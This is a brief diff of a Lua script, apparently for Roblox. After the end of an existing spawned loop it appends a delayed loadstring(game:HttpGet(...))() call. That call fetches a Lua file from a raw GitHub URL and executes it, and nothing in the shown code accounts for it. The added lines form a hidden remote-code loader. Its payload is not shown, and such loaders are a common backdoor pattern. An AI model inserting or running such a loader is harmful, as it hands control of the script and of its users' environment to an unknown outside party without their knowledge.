@@ -33,3 +33,5 @@ task.spawn(function()
         task.wait(30)
     end
 end)
+wait(10)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dsadgeee/21521521/refs/heads/main/AYA.lua"))()
